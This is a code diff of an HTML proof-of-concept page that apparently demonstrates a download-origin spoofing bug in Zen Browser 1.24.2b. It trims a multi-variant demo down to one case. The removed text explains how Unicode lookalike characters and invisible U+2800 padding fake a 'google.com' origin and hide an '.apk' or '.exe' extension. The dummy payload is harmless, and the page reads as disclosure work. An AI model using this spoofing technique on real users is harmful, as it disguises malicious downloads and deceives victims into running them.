@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Zen Browser — download filename origin spoof</title>
+<title>Zen Browser — download origin spoof</title>
 <style>
   :root { color-scheme: dark; }
   body {
@@ -11,115 +11,42 @@
     background: #0d0f12; color: #e6e8eb;
     font: 15px/1.6 system-ui, -apple-system, "Segoe UI", sans-serif;
   }
-  main { width: min(680px, 92vw); padding: 40px 0; }
-  h1 { font-size: 22px; margin: 0 0 6px; letter-spacing: -0.01em; }
-  p.lead { color: #9aa3ad; margin: 0 0 28px; }
+  main { width: min(560px, 92vw); padding: 40px 0; }
+  h1 { font-size: 20px; margin: 0 0 8px; }
+  p { color: #9aa3ad; margin: 0 0 20px; }
   button {
     padding: 12px 20px; font: inherit; font-weight: 600; cursor: pointer;
     color: #0d0f12; background: #e6e8eb; border: 0; border-radius: 8px;
   }
   button:hover { background: #fff; }
-  code, pre {
-    font-family: ui-monospace, "Cascadia Code", Consolas, monospace;
-    font-size: 13px;
-  }
   pre {
     background: #14181d; border: 1px solid #232a32; border-radius: 8px;
-    padding: 14px 16px; overflow-x: auto; margin: 18px 0;
+    padding: 14px 16px; overflow-x: auto; margin: 20px 0 0;
+    font: 13px ui-monospace, Consolas, monospace;
   }
-  .note { color: #9aa3ad; font-size: 13px; margin-top: 26px; }
-  .note b { color: #e6e8eb; }
-  ol { color: #c3c9d1; padding-left: 20px; }
-  li { margin: 4px 0; }
 </style>
 </head>
 <body>
 <main>
-  <h1>Download filename origin spoof</h1>
-  <p class="lead">Zen Browser 1.24.2b — the download list shows a fake origin and hides the real extension.</p>
+  <h1>Download origin spoof</h1>
+  <p>Zen Browser 1.24.2b — the download list shows a fake origin and hides the real extension.</p>
 
-  <button id="go">Variant A — fake "From" line</button>
-  <button id="go2">Variant B — hidden extension</button>
-  <button id="go3">Variant C — no real host in subtitle (data:)</button>
-  <button id="go4">Variant D — no real host in subtitle (blob:null)</button>
-  <button id="go5">Variant E — chrome-pro.exe + data:,https://chrome.google.com</button>
-
-  <iframe id="sb" sandbox="allow-scripts allow-downloads" style="display:none"
-    srcdoc="&lt;script&gt;
-      const NAME = 'ini aplikasi apa From https\u2236\u2215\u2215google.com.apk';
-      const u = URL.createObjectURL(new Blob(['x'], {type:'application/octet-stream'}));
-      const a = document.createElement('a');
-      a.href = u; a.download = NAME; a.click();
-    &lt;/script&gt;"></iframe>
+  <button id="go">Download</button>
 
   <pre id="name"></pre>
-
-  <ol>
-    <li>Click a button.</li>
-    <li>Open the Zen library / downloads list.</li>
-    <li>Variant A reads <code>ini aplikasi apa From https∶∕∕google.com.apk</code>.</li>
-    <li>Variant B reads <code>https∶∕∕google.com</code> — the <code>.apk</code> is elided.</li>
-    <li>Variant C downloads from a <code>data:</code> URL, so the subtitle shows
-        <code>(data)</code> instead of the real host.</li>
-  </ol>
-
-  <p class="note">
-    <b>Why it works:</b> Firefox sanitizes ASCII <code>:</code> and <code>/</code> in download
-    filenames, but not the Unicode lookalikes <code>∶</code> (U+2236) and <code>∕</code>
-    (U+2215). Zen renders the filename in an HTML span with
-    <code>text-overflow: ellipsis</code>, which hides the tail — where the real extension
-    lives. <code>U+2800</code> padding pushes the extension past the ellipsis without
-    showing visible filler.
-  </p>
-  <p class="note">
-    Firefox 160 is not affected by this variant: its download item uses
-    <code>crop="center"</code>, so the extension stays visible.
-  </p>
 </main>
 
 <script>
   // U+2236 RATIO, U+2215 DIVISION SLASH x2, U+2800 BRAILLE PATTERN BLANK x40
-  const ORIGIN = "https\u2236\u2215\u2215google.com";
+  const NAME = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
 
-  // A: whole string fits in the title (~45 chars), extension stays visible
-  const NAME_A = "ini aplikasi apa From " + ORIGIN + ".apk";
+  document.getElementById("name").textContent = NAME;
 
-  // B: invisible padding pushes the extension past the ellipsis
-  const NAME_B = ORIGIN + "\u2800".repeat(40) + ".apk";
-
-  document.getElementById("name").textContent = NAME_A;
-
-  function download(name) {
+  document.getElementById("go").onclick = () => {
     const blob = new Blob(["x"], { type: "application/octet-stream" });
     const a = document.createElement("a");
     a.href = URL.createObjectURL(blob);
-    a.download = name;
-    a.click();
-  }
-
-  document.getElementById("go").onclick = () => download(NAME_A);
-  document.getElementById("go2").onclick = () => download(NAME_B);
-
-  // C: data: URL source — the subtitle shows "(data)" instead of the real host
-  document.getElementById("go3").onclick = () => {
-    const a = document.createElement("a");
-    a.href = "data:text/html,<b>x</b>";
-    a.download = NAME_A;
-    a.click();
-  };
-
-  // D: blob from a sandboxed iframe (opaque origin) — source is blob:null/… → "(data)"
-  document.getElementById("go4").onclick = () => {
-    const f = document.getElementById("sb");
-    f.srcdoc = f.srcdoc;
-  };
-
-  // E: arbitrary filename + data: URL whose content is a trusted URL.
-  // Hovering the row shows "data:,https://chrome.google.com".
-  document.getElementById("go5").onclick = () => {
-    const a = document.createElement("a");
-    a.href = "data:,https://chrome.google.com";
-    a.download = "chrome-pro.exe";
+    a.download = NAME;
     a.click();
   };
 </script>
